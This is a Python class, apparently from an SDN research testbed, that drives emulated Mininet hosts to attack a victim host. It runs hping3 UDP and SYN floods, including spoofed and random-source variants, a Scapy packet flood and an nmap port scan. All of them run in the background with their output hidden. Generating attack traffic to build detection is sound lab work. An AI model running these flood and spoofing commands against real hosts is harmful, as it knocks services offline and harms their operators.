import random
import time

class AttackManager:
    def __init__(self, net):
        self.net = net
        self.attackers = [net.get(f'h{i}') for i in range(1, 7)]
        self.victim = net.get('h8')
        self.active_pids = []

    # ================================
    # DDoS
    # ================================
    def ddos_flood(self):
        print(f"[*] Starting DDoS flood: {len(self.attackers)} hosts -> {self.victim.IP()}")
        for attacker in self.attackers:
            # Chạy ngầm (&), ẩn output (> /dev/null), và lấy PID ($!)
            cmd = f'hping3 --flood --udp -p 80 {self.victim.IP()} > /dev/null 2>&1 & echo $!'
            pid = attacker.cmd(cmd).strip()
            self.active_pids.append((attacker, pid))

    # ================================
    # Packet-In Flood
    # ================================
    def packet_in_flood(self):
        attacker = random.choice(self.attackers)
        print(f"[*] Packet-In Flood từ {attacker.name} -> {self.victim.IP()}")
        # Scapy gửi gói tin TCP với port ngẫu nhiên liên tục
        cmd = f'python3 -c "from scapy.all import *; send(IP(dst=\\"{self.victim.IP()}\\")/TCP(sport=RandShort(), dport=RandShort()), loop=1, verbose=0)" > /dev/null 2>&1 & echo $!'
        pid = attacker.cmd(cmd).strip()
        self.active_pids.append((attacker, pid))

    # ================================
    # Flow Table Overflow
    # ================================
    def flow_overflow(self):
        # Tấn công lấp đầy bảng flow nhanh nhất là dùng hping3 với IP nguồn giả mạo ngẫu nhiên
        attacker = random.choice(self.attackers)
        print(f"[*] Flow Table Overflow từ {attacker.name}...")
        cmd = f'hping3 --flood --rand-source -S -p 80 {self.victim.IP()} > /dev/null 2>&1 & echo $!'
        pid = attacker.cmd(cmd).strip()
        self.active_pids.append((attacker, pid))

    # ================================
    # IP Spoofing
    # ================================
    def ip_spoofing(self):
        attacker = random.choice(self.attackers)
        fake_ip = f"10.0.0.{random.randint(100,200)}"
        print(f"[*] IP Spoofing: {attacker.name} giả mạo {fake_ip} tấn công {self.victim.IP()}")
        cmd = f'hping3 --flood -S -a {fake_ip} {self.victim.IP()} > /dev/null 2>&1 & echo $!'
        pid = attacker.cmd(cmd).strip()
        self.active_pids.append((attacker, pid))

    # ================================
    # Port Scanning
    # ================================
    def port_scanning(self):
        attacker = random.choice(self.attackers)
        print(f"[*] Port Scanning từ {attacker.name}...")
        # Quét dồn dập nhiều port
        cmd = f'nmap -sT -p 1-10000 {self.victim.IP()} > /dev/null 2>&1 & echo $!'
        pid = attacker.cmd(cmd).strip()
        self.active_pids.append((attacker, pid))

    # ================================
    # STOP ALL
    # ================================
    def stop_all(self):
        print("[*] Đang dừng tất cả các tiến trình tấn công...")
        for attacker, pid in self.active_pids:
            try:
                attacker.cmd(f'kill -9 {pid}')
            except:
                pass
        # Dọn dẹp triệt để trên toàn bộ các host
        for host in self.attackers:
            host.cmd('pkill -9 hping3 nmap python3')
        self.active_pids.clear()
        print("[+] Hệ thống đã sạch tấn công.")